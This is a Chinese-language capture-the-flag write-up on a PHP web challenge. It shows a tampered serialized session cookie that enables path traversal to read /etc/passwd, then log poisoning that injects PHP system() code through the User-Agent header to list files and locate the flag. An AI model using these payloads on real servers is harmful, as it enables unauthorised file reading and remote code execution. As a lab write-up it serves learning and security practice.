## 總結

漏洞：
- LFI



## 觀察

### flag 產生

抓網站程式碼下來，可以知道 flag 檔案名稱是亂數產生

```
# Generate random flag filename
mv /flag /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`
```

### PHPSESSID 產生

抓程式碼看 index.php
```
if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 
```

他是序列化後，用 base64 encode 

我用 chrome plugin: `cookie editor`

撈下來 decode
```
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```

那這邊改為底下，在 encode
```
O:9:"PageModel":1:{s:4:"file";s:37:"../../../../../../../../../etc/passwd";}
```

直接用 cookie editor 改完就會看到有密碼
`LFI`

這邊可以看到密碼最底下是
```
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```

知道是 nginx ，那去讀一下 log: `/var/log/nginx/access.log`


log 長相如下
```
HTTP/1.1" "http://178.128.163.152:32485/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 111.71.214.14 - 200 "GET /static/js/production.js
```

他會在 log 中放入 user-agent ，所以嘗試放 php code 到 user-agent 裡面
這邊放
```
<?php system('ls /');?>
```

之後就是回去看 log 看到 flag 名稱

然後再用 LFI 去讀 flag 即可 